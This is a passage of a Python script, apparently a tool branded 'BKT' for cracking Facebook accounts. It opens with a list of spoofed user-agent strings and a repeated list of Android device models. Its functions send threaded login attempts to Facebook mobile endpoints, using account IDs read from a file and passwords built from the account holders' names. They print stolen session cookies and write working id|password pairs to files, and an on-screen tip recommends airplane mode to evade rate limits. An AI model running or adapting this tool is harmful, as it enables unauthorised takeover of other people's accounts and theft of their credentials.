'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J748P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4725.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z695M) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4498.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P676U) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4403.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W958C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4605.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U545M) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4466.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A713U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4254.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B687P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4394.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H674W) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4725.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C733U) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4497.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O607D) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4425.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L877W) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4773.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P105Y) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4338.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R330V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4273.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W26O) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4670.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P297J) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4477.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A4R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4226.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D648X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4820.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S903F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4251.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M14R) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4707.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U221B) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4633.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H501C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4233.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N473I) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4825.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W282B) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4294.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C929O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4847.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J541T) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4725.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U209J) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4435.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O165D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4674.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P420W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4436.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O109Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4796.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A25P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4685.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N756U) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4581.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y733L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4605.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I663X) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4714.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C782R) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4447.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D844L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4532.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A159A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4418.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M439C) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4258.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P589Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4487.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F104A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4879.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X323Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4845.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D766P) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4526.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10;Win64; x64)I419C) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4578.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B955K) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4533.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G175G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4446.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C191W) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4899.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y369T) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4437.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G704I) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4706.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I954X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4814.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A963W) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4660.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E843S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4535.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S625P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4368.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W438P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4422.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U492V) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4327.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P328F) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4772.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N590Q) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4821.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T132K) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4626.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A624Z) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4603.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E231N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4561.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E982A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4653.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P797R) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4608.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V440P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4866.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X857Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4340.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H91P) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4430.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X360Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4526.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y604V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4205.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W690L) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4501.60 Chrome/105.0.0.0 Safari/537.36']
			session = requests.Session()
			sys.stdout.write('\r[%s/%s]OK:-%s'%(loop,tl,len(oks))),
			sys.stdout.flush()
			pro = random.choice(ugen)
			free_fb = session.get('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {
    'authority': 'x.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en;q=0.9,fa-AF;q=0.8,fa;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://x.facebook.com',
    'referer': 'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Microsoft Edge";v="113"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': pro}
			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[BKT-OK] '+cid+' | '+ps+'\33[0;97m')
				print("\33[0;97m[🍪] \33[1;98mCOOKIES : \33[0;97m"+coki)
				open('BKT-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid);
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\33[1;91m[BKT-CP] '+uid+' | '+ps+'\33[0;97m')
				open('BKT-CP.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def file():
		clear()
		print("\033[1;32m[√]\033[1;37m EXAMPLE: \033[1;32m/sdcard/BKT.txt");lines()
		file = input(f'\033[1;32m[?]\033[1;37m PUT FILE : ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			lines()
			print(f'[!] {RED}FILE NOT FOUND{WHITE} !')
			Main()
		clear()
		plist=[]
		try:
			clear()
			ps_limit = int(input(f'\033[1;32m[>]\033[1;37m PUT PASS LIMIT : '));clear()
		except:
			ps_limit =1
		print(f'\033[1;32m[>] \033[1;32mEXAMPLE :\033[1;37m firstlast , first last , first@123');lines()
		for i in range(ps_limit):
			plist.append(input(f'\033[1;32m[?]\033[1;37m PUT PASSWORD\033[1;32m {i+1} : \033[1;37m'))
		clear()
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f"[+] TOTAL IDZ  : "+total_ids+" ")
			print(47*"-");print('	USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				else:
					crack_submit.submit(ffb,ids,names,passlist)

        

def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\33[1;37m[BKT] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
        sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m[BKT-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/BKT-OK.txt', 'a').write(ids+' | '+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in cp:
                                        print(f'\r\r\033[1;37m[BKT-CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/BKT-CP.txt', 'a').write(ids+' | '+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")


xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")



Main()